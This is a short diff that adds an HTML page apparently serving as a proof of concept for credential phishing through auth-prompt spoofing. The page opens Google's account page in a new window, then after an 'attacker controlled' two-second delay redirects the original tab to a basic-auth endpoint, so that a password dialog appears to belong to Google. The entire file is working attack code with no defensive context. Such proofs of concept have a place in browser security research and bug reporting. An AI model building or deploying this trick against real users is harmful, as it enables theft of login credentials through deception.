@@ -1,0 +1,18 @@
+<script>
+function test() {
+window.open("https://accounts.google.com")
+
+//attacker controlled timeframe
+setTimeout(authPrompt, 2000)
+
+}
+
+function authPrompt() {
+location.href="http://httpbin.org/basic-auth/test/best"
+}
+</script>
+<center>
+<br>
+<br>
+<button onclick="test()"><h1>TEST</h1></button>
+</center>
